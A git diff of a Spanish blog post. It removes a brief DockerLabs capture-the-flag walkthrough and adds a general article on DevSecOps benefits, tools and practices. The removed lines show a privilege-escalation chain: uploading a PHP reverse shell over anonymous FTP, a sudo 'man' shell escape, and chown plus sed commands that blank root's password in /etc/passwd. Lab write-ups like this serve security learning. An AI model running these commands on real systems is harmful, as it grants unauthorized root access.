@@ -1,56 +1,78 @@
 ---
-title: 'Articulo 1'
-description: EcoBuddy is a mobile app that gamifies sustainable living. Users can set eco-friendly goals, track their carbon footprint, and earn virtual rewards for adopting environmentally conscious habits.
-publishDate: 'Jan 02 2024'
+title: DevSecOps Integrando Seguridad en el Ciclo de Vida del Desarrollo
+excerpt: WritheUp maquina de DockerLabs
+publishDate: 'Sept 19 2024'
+updatedDate: 'Sept 19 2024'
 isFeatured: true
+tags:
+  - Web
+  - Guide
+  - CTF
 seo:
   image:
-    src: '/project-1.jpg'
-    alt: Project preview
+    src: '/post-14.jpg'
+    alt: Wavy lines
 ---
 
 
-> Web frameworks are the architectural blueprints that empower developers to build the digital landscapes of tomorrow.
 
 
+## Introducción
 
-Entramos por ftp con usuario anonymous.
-Nos conectamos desde el directorio Downloads en nuestra maquina atacante al host victima por ftp y subimos una reverse shell con ftp 
+En un entorno digital donde las amenazas cibernéticas son cada vez más sofisticadas, las prácticas tradicionales de desarrollo de software ya no son suficientes para garantizar la seguridad. Es aquí donde entra en juego **DevSecOps**, una evolución del enfoque DevOps que integra la **seguridad** desde el inicio del ciclo de vida del desarrollo de software.
 
-```
-put  php-reverse-shell2.php
-```
+En este artículo, exploraremos qué es DevSecOps, sus beneficios, las herramientas más utilizadas y las mejores prácticas para implementarlo.
 
-Ya adentro revisamos los usuarios con:
-```
-cat /etc/passwd | grep sh$
-```
+## ¿Qué es DevSecOps?
 
-Revisamos los permiso que tenemos:
+**DevSecOps** (Development, Security, and Operations) es una metodología que combina el desarrollo de software, la seguridad y las operaciones en un solo flujo continuo. En lugar de abordar la seguridad como una fase posterior o separada del desarrollo, DevSecOps propone incluirla desde las primeras etapas del ciclo de vida del software, asegurando que las aplicaciones y los sistemas sean seguros por diseño.
 
+### Diferencias entre DevOps y DevSecOps
 
+DevOps se centra en la colaboración entre los equipos de desarrollo y operaciones para acelerar la entrega de software mediante la automatización y la integración continua. Sin embargo, en el proceso tradicional de DevOps, la **seguridad** a menudo se trata como un aspecto secundario que se gestiona al final del ciclo de desarrollo.
 
-Con el comando sudo -u pingu man man abrimos un binario y ponemos !/bin/bash
+**DevSecOps** introduce la seguridad como un pilar fundamental a lo largo del ciclo de vida, desde la planificación hasta la producción, haciendo que cada miembro del equipo sea responsable de las buenas prácticas de seguridad.
 
+## Beneficios de DevSecOps
 
+1. **Detección temprana de vulnerabilidades**: Al incluir la seguridad desde el principio, los equipos pueden identificar y corregir vulnerabilidades antes de que se conviertan en problemas graves.
+2. **Reducción de riesgos**: La automatización de pruebas de seguridad y la implementación de políticas de seguridad consistentes ayudan a reducir los riesgos de exposición a ataques.
+3. **Mejor colaboración**: DevSecOps fomenta la cooperación entre los equipos de desarrollo, operaciones y seguridad, creando una cultura de responsabilidad compartida.
+4. **Entrega más rápida y segura**: Automatizar procesos de seguridad permite a los equipos entregar software más rápido sin comprometer la protección.
+5. **Cumplimiento continuo**: DevSecOps permite cumplir con normativas y regulaciones de seguridad desde el inicio, lo que facilita auditorías y reportes.
 
-Ahora somo el usuario pingu, repetimos el proceso:
+## Principales herramientas en DevSecOps
 
+El ecosistema de herramientas de DevSecOps está diseñado para automatizar y reforzar la seguridad en cada etapa del ciclo de vida del software. Aquí algunas de las más utilizadas:
 
+- **SAST (Static Application Security Testing)**: Herramientas como **SonarQube** o **Checkmarx** permiten analizar el código fuente para detectar vulnerabilidades estáticas.
+- **DAST (Dynamic Application Security Testing)**: Herramientas como **OWASP ZAP** o **Burp Suite** realizan pruebas dinámicas de seguridad en las aplicaciones mientras están en ejecución.
+- **Contenedores y seguridad en la nube**: **Docker** y **Kubernetes** son plataformas populares, con herramientas de seguridad como **Aqua Security** y **Sysdig** para proteger entornos de contenedores.
+- **CI/CD y automatización**: Herramientas como **Jenkins**, **GitLab CI** y **CircleCI** facilitan la integración continua y la entrega continua con pruebas de seguridad automatizadas.
 
-Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:
+## Principales prácticas de DevSecOps
 
-`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`
+Para implementar DevSecOps de manera efectiva, es importante seguir una serie de **mejores prácticas**:
 
-Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.
+1. **Seguridad desde el principio (Shift-Left Security)**: Integra la seguridad en las primeras etapas del desarrollo, realizando evaluaciones de riesgos y pruebas de vulnerabilidad desde la fase de diseño.
+2. **Automatización de pruebas de seguridad**: Usa herramientas automatizadas para realizar pruebas de seguridad estáticas y dinámicas, asegurando que cada cambio en el código se analice.
+3. **Cultura colaborativa**: Fomenta la colaboración entre los equipos de desarrollo, operaciones y seguridad. Cada miembro del equipo debe tener conciencia sobre la seguridad.
+4. **Políticas de seguridad como código**: Las configuraciones de seguridad deben ser gestionadas como código, lo que garantiza que sean replicables y consistentes en todos los entornos.
+5. **Monitoreo y auditoría continua**: Implementa monitoreo en tiempo real y auditorías constantes para detectar y responder a posibles incidentes de seguridad.
 
-`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`
+## Retos de DevSecOps
 
-Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba
+A pesar de sus beneficios, DevSecOps también enfrenta varios desafíos:
 
-`cp /tmp/passwd.tmp /etc/passwd`
+- **Resistencia al cambio**: Algunas organizaciones pueden resistirse a adoptar DevSecOps debido a la percepción de que la seguridad ralentiza el desarrollo.
+- **Falta de formación**: Los equipos de desarrollo pueden carecer de la formación adecuada en seguridad, lo que dificulta su integración efectiva.
+- **Complejidad de herramientas**: La amplia gama de herramientas necesarias para DevSecOps puede ser difícil de gestionar, lo que requiere una cuidadosa selección y configuración.
 
+## Conclusión
 
+**DevSecOps** no es solo una metodología, sino una cultura que prioriza la seguridad a lo largo de todo el ciclo de vida del software. Al automatizar pruebas, implementar políticas de seguridad consistentes y fomentar la colaboración entre equipos, DevSecOps permite a las organizaciones desarrollar aplicaciones más rápidas, seguras y confiables. En un mundo donde las ciberamenazas están en constante evolución, adoptar DevSecOps es esencial para proteger los activos digitales de las empresas.
 
-Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña
+---
+
+Si estás buscando mejorar la seguridad en el desarrollo de software en tu organización, **DevSecOps** es el enfoque ideal para garantizar una protección continua y escalable.
 
